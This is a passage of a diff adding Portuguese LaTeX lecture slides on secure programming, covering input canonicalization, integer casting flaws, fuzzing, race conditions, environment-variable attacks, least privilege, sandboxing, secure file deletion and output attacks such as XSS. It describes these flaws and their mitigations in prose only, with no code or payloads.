+                  \item Ação em caso de falha: Rejeitar a entrada ou sanitizá-la (escapar metacaracteres).
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Codificações Múltiplas e Canonicalização}
+    \begin{itemize}
+        \item \textbf{O Problema das Múltiplas Representações:}
+              \begin{itemize}
+                  \item Caracteres podem ter múltiplas codificações (HTML, Unicode/UTF-8).
+                  \item Exemplo: O caractere ``/'' pode ser representado de várias formas em UTF-8 (além do padrão hexadecimal 2F).
+                  \item Atacantes usam codificações longas/redundantes para burlar filtros de segurança (ex: falha no Microsoft IIS nos anos 90).
+              \end{itemize}
+
+        \item \textbf{Solução: Canonicalização:}
+              \begin{itemize}
+                  \item Processo de transformar os dados de entrada em uma representação única, padrão e mínima.
+                  \item Deve ser realizada \textbf{antes} da validação.
+                  \item Recomenda-se o uso de bibliotecas anti-XSS ou frameworks Web que automatizem esse processo.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Tratamento de Valores Numéricos}
+    \begin{itemize}
+        \item \textbf{Representação Computacional:}
+              \begin{itemize}
+                  \item Valores fixos (8, 16, 32, 64 bits) e tipos (com sinal/sem sinal).
+              \end{itemize}
+
+        \item \textbf{Vulnerabilidade de Conversão (Casting):}
+              \begin{itemize}
+                  \item Ocorre quando um valor é convertido de um tipo para outro incorretamente.
+                  \item \textbf{Exemplo:} Um tamanho de buffer lido como \textit{unsigned} (sem sinal) e depois tratado como \textit{signed} (com sinal) em uma comparação.
+                  \item Um valor muito grande (ex: bit superior setado) pode ser interpretado como negativo, passando na verificação de tamanho máximo, mas causando \textit{overflow} quando usado para alocação ou cópia.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Teste de Entrada: Fuzzing}
+    \begin{itemize}
+        \item \textbf{Definição:} Técnica de teste de software desenvolvida por Barton Miller (1989) que utiliza dados gerados aleatoriamente como entrada.
+
+        \item \textbf{Objetivo:}
+              \begin{itemize}
+                  \item Determinar se o programa lida corretamente com entradas anormais ou se falha (crashes).
+              \end{itemize}
+
+        \item \textbf{Características:}
+              \begin{itemize}
+                  \item \textbf{Vantagens:} Simplicidade, baixo custo, independência de suposições sobre a entrada esperada. Identifica falhas sérias e exploráveis.
+                  \item \textbf{Limitações:} Pode não encontrar bugs que requerem condições de entrada muito específicas.
+              \end{itemize}
+
+        \item \textbf{Uso:} Ferramenta essencial tanto para desenvolvedores (prevenção) quanto para atacantes (descoberta de vulnerabilidades).
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Escrita de Código de Programa Seguro (Algoritmos)}
+    \begin{itemize}
+        \item \textbf{Implementação Correta do Algoritmo:}
+              \begin{itemize}
+                  \item Falhas no design ou implementação podem gerar bugs exploráveis (ex: gerador de números aleatórios previsível no Netscape antigo, permitindo quebra de criptografia).
+                  \item \textbf{Exemplo Crítico:} Ataques de \textit{TCP session hijacking} exploram números de sequência iniciais previsíveis.
+              \end{itemize}
+
+        \item \textbf{Correspondência Máquina-Algoritmo:}
+              \begin{itemize}
+                  \item O código de máquina gerado deve representar fielmente o algoritmo de alto nível.
+                  \item Risco de compiladores maliciosos (Ken Thompson, 1984) inserindo backdoors invisíveis no código fonte.
+              \end{itemize}
+
+        \item \textbf{Código de Depuração (Debug):}
+              \begin{itemize}
+                  \item Código de teste deixado em produção pode permitir acesso indevido ou bypass de segurança (ex: Morris Worm explorando comando DEBUG no sendmail).
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Interpretação de Dados e Memória}
+    \begin{itemize}
+        \item \textbf{Interpretação de Valores de Dados:}
+              \begin{itemize}
+                  \item A interpretação de bits (inteiro, char, ponteiro) depende das instruções de máquina.
+                  \item Linguagens com tipagem fraca (como C) permitem manipulação direta de memória/ponteiros, facilitando erros como \textit{buffer overflows} e corrupção de estruturas de dados.
+                  \item \textbf{Defesa:} Usar linguagens com tipagem forte ou validar rigorosamente conversões de tipo (\textit{casts}).
+              \end{itemize}
+
+        \item \textbf{Uso Correto da Memória:}
+              \begin{itemize}
+                  \item Falha na liberação de memória dinâmica causa \textbf{vazamento de memória (memory leak)}, podendo levar a exaustão de recursos e DoS.
+                  \item Linguagens modernas (Java, C++) com gerenciamento automático são preferíveis a C (manual) para evitar esses erros.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Concorrência e Condições de Corrida}
+    \begin{itemize}
+        \item \textbf{Condições de Corrida (Race Conditions):}
+              \begin{itemize}
+                  \item Ocorrem quando múltiplos processos/threads competem por acesso não controlado a recursos compartilhados (memória).
+                  \item Sem sincronização adequada, valores podem ser corrompidos ou alterações perdidas.
+              \end{itemize}
+
+        \item \textbf{Deadlock:}
+              \begin{itemize}
+                  \item O uso incorreto de primitivas de sincronização pode travar processos (espera circular).
+                  \item Atacantes podem disparar deadlocks propositalmente para causar Negação de Serviço (DoS).
+              \end{itemize}
+
+        \item \textbf{Mitigação:}
+              \begin{itemize}
+                  \item Seleção correta de primitivas de sincronização e design cuidadoso para limitar áreas de acesso compartilhado.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Interação com o Sistema Operacional}
+    \begin{itemize}
+        \item \textbf{O Ambiente de Execução:}
+              \begin{itemize}
+                  \item Programas não rodam isolados; o S.O. media o acesso aos recursos.
+                  \item O S.O. constrói o ambiente do processo, incluindo código, dados, argumentos de linha de comando e variáveis de ambiente.
+                  \item \textbf{Regra:} Todos esses dados devem ser tratados como entradas externas e validados.
+              \end{itemize}
+
+        \item \textbf{Controle de Acesso:}
+              \begin{itemize}
+                  \item Recursos (arquivos, dispositivos) possuem permissões baseadas em usuários/grupos.
+                  \item Programas precisam de acesso apropriado para funcionar, mas acesso excessivo é perigoso.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Variáveis de Ambiente}
+    \begin{itemize}
+        \item \textbf{O que são:} Coleção de valores de string herdados do processo pai (ex: PATH, IFS, LD\_LIBRARY\_PATH).
+
+        \item \textbf{Vulnerabilidades:}
+              \begin{itemize}
+                  \item São uma porta de entrada para dados não confiáveis.
+                  \item \textbf{Ataques ao PATH:} Um atacante altera o PATH para que um script privilegiado execute um programa malicioso (ex: um `grep` falso) em vez do utilitário do sistema.
+                  \item \textbf{Ataques ao LD\_LIBRARY\_PATH:} Carregamento de bibliotecas dinâmicas maliciosas em programas privilegiados.
+              \end{itemize}
+
+        \item \textbf{Mitigação:}
+              \begin{itemize}
+                  \item Evitar scripts de shell privilegiados (difíceis de segurar).
+                  \item Usar programas \textit{wrappers} compilados para limpar o ambiente antes de chamar scripts.
+                  \item Resetar variáveis críticas para valores seguros conhecidos no início da execução.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Princípio do Menor Privilégio}
+    \begin{itemize}
+        \item \textbf{Conceito:} Programas devem executar com o mínimo de privilégios necessários para completar sua função.
+
+        \item \textbf{Escalação de Privilégio:}
+              \begin{itemize}
+                  \item Se um programa privilegiado (ex: root) é comprometido, o atacante ganha controle total.
+              \end{itemize}
+
+        \item \textbf{Práticas Recomendadas:}
+              \begin{itemize}
+                  \item Preferir conceder privilégios de \textbf{grupo} em vez de usuário (facilita auditoria).
+                  \item \textbf{Gerenciamento de Arquivos:} Programas privilegiados (como servidores Web) não devem ser donos de todos os seus arquivos, apenas ter permissão de leitura onde necessário.
+                  \item Evitar que servidores rodem como \textit{root} o tempo todo (usar root apenas para ligar portas baixas e depois reduzir privilégio).
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Modularização e Isolamento}
+    \begin{itemize}
+        \item \textbf{Design Seguro:}
+              \begin{itemize}
+                  \item Particionar programas grandes e complexos em módulos menores.
+                  \item Conceder privilégios elevados apenas aos módulos que realmente precisam, e por pouco tempo.
+                  \item Facilita testes e verificação (ex: servidor de e-mail Postfix).
+              \end{itemize}
+
+        \item \textbf{Sandboxing e Chroot:}
+              \begin{itemize}
+                  \item Executar programas vulneráveis em ambientes isolados.
+                  \item \textbf{Chroot Jail:} Limita a visão do sistema de arquivos do programa a um diretório específico.
+                  \item \textbf{Limitação:} Configuração difícil; se feita incorretamente, o programa pode escapar ou falhar.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Chamadas de Sistema e Suposições}
+    \begin{itemize}
+        \item \textbf{O Conflito de Otimização:}
+              \begin{itemize}
+                  \item O S.O. e bibliotecas padrão usam buffers e reordenamento para otimizar performance.
+                  \item Essas otimizações podem conflitar com requisitos de segurança (ex: garantir que dados foram apagados do disco).
+              \end{itemize}
+
+        \item \textbf{Estudo de Caso: Deleção Segura de Arquivos (File Shredding):}
+              \begin{itemize}
+                  \item \textbf{Problema:} Sobrescrever um arquivo não garante que os dados antigos sumiram.
+                  \item \textbf{Camadas de Falha:} Buffers da biblioteca de I/O, buffers do sistema de arquivos, controladores de disco inteligentes (que evitam reescritas no mesmo bloco, especialmente em SSDs/Flash).
+                  \item \textbf{Lição:} O programador seguro deve entender e controlar explicitamente essas camadas (ex: forçar \textit{flush} e \textit{sync}).
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Geração e Segurança de Saída}
+    \begin{itemize}
+        \item \textbf{Natureza da Saída:}
+              \begin{itemize}
+                  \item Pode ser binária (protocolos de rede, estruturas gráficas) ou textual (HTML, conjuntos de caracteres).
+                  \item Deve conformar-se estritamente ao formato e interpretação esperados pelo dispositivo ou usuário.
+              \end{itemize}
+
+        \item \textbf{O Problema da Origem Comum:}
+              \begin{itemize}
+                  \item Usuários assumem que a saída foi gerada e validada pelo programa confiável.
+                  \item Essa suposição falha quando o programa aceita entrada de um usuário e a exibe para outro (ex: comentários, fóruns) sem a devida sanitização.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Exemplos de Ataques via Saída}
+    \begin{itemize}
+        \item \textbf{Ataques a Terminais (Legado/VT100):}
+              \begin{itemize}
+                  \item Uso de sequências de escape (\textit{escape sequences}) em textos maliciosos.
+                  \item Podiam reprogramar teclas de função para executar comandos arbitrários (ex: deletar arquivos) quando a vítima visualizasse o texto.
+              \end{itemize}
+
+        \item \textbf{Cross-Site Scripting (XSS):}
+              \begin{itemize}
+                  \item Explora a confiança do navegador no site de origem.
+                  \item Dados não sanitizados de terceiros permitem a execução de scripts (JavaScript) no contexto do navegador da vítima.
+              \end{itemize}
+    \end{itemize}
+\end{frame}
+
+\begin{frame}{Mitigação: Filtragem e Codificação}
+    \begin{itemize}
+        \item \textbf{Estratégia de Filtragem:}
+              \begin{itemize}
+                  \item Programas que retransmitem dados de terceiros são responsáveis pela segurança.
+                  \item Preferir permitir apenas conteúdo seguro conhecido (\textit{Whitelisting}) em vez de tentar remover o perigoso.
+              \end{itemize}
+
+        \item \textbf{Codificação de Caracteres:}
+              \begin{itemize}
+                  \item Diferentes \textit{charsets} podem alterar a interpretação de metacaracteres.
+                  \item A codificação deve ser especificada explicitamente (ex: cabeçalho \texttt{Content-Type}) para evitar que o navegador assuma um padrão inseguro.
+              \end{itemize}
+
+        \item \textbf{Alvo do Compromisso:} O ataque visa o usuário ou dispositivo de exibição, não o servidor, mas danifica a reputação do software.
     \end{itemize}
 \end{frame}
